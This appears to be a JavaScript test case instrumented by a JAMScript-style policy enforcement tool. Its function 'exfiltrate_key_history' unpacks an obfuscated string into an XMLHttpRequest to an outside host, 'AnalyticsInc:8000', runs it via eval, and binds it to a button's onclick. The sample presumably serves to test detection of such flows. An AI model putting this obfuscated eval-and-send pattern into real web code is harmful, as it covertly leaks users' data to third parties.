function exfiltrate_key_history() {
  function v3(_0x9e37x1, _0x9e37x2, _0x9e37x3, _0x9e37x4, _0x9e37x5, _0x9e37x6) {
    function v2() {
      return _0x1636[6]
    }
    function v1(_0x9e37x5$$1) {
      introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
        return _0x9e37x6[_0x9e37x5$$1]
      }
    }
    function v0(_0x9e37x3$$1) {
      return _0x9e37x3$$1.toString(36)
    }
    _0x9e37x5 = v0;
    var v21 = _0x1636[5];
    var v22 = _0x1636[4];
    introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
      var v31 = [[/^/, String], v21, v21[v22]]
    }
    var v15 = JAMScript.call(v31[2], v31[1], v31[0]);
    var v7 = !v15;
    if(v7) {
      var v6 = _0x9e37x3;
      _0x9e37x3 = _0x9e37x3 - 1;
      for(;v6;) {
        var v4 = _0x9e37x6;
        var v5 = _0x9e37x3.toString(_0x9e37x2);
        introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
          var v16 = _0x9e37x4[_0x9e37x3]
        }
        var v23 = !v16;
        if(v23) {
          v16 = _0x9e37x3.toString(_0x9e37x2)
        }
        JAMScript.set(v4, v5, v16);
        v6 = _0x9e37x3;
        _0x9e37x3 = _0x9e37x3 - 1
      }
      _0x9e37x4 = [v1];
      _0x9e37x5 = v2;
      _0x9e37x3 = 1
    }
    var v12 = _0x9e37x3;
    _0x9e37x3 = _0x9e37x3 - 1;
    for(;v12;) {
      introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
        var v11 = _0x9e37x4[_0x9e37x3]
      }
      if(v11) {
        var v8 = _0x1636[4];
        var v29 = _0x1636[7];
        var v30 = JAMScript.call(_0x9e37x5, null, [_0x9e37x3]);
        var v24 = v29 + v30;
        var v25 = _0x1636[7];
        var v17 = v24 + v25;
        var v18 = _0x1636[8];
        var v9 = new RegExp(v17, v18);
        introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
          var v10 = _0x9e37x4[_0x9e37x3]
        }
        introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
          var v32 = [[v9, v10], _0x9e37x1, _0x9e37x1[v8]]
        }
        _0x9e37x1 = JAMScript.call(v32[2], v32[1], v32[0])
      }
      v12 = _0x9e37x3;
      _0x9e37x3 = _0x9e37x3 - 1
    }
    return _0x9e37x1
  }
  var _0x1636 = ['0=5 4();0.7("3","1://2:6/8.d?c=b",9);0.a(e);', "|", "split", "xmlhttp|http|AnalyticsInc|GET|XMLHttpRequest|new|8000|open|submission|true|send|multi|test|html|null", "replace", "", "\\w+", "\\b", "g"];
  var v19 = _0x1636[0];
  var v26 = _0x1636[3];
  var v27 = _0x1636[2];
  var v28 = _0x1636[1];
  introspect(JAMScript.introspectors.processC545F199BE443C5FB0DC91C55134FB746FD8B074) {
    var v33 = [[v28], v26, v26[v27]]
  }
  var v20 = JAMScript.call(v33[2], v33[1], v33[0]);
  var v13 = v3(v19, 15, 15, v20, 0, {});
  if(JAMScript.isEval(eval)) {
    eval("introspect(JAMScript.introspectors.processAll) { " + v13 + " }")
  }else {
    JAMScript.call(eval, null, [v13])
  }
  return
}
var v14 = document.getElementById("test");
JAMScript.set(v14, "onclick", exfiltrate_key_history);

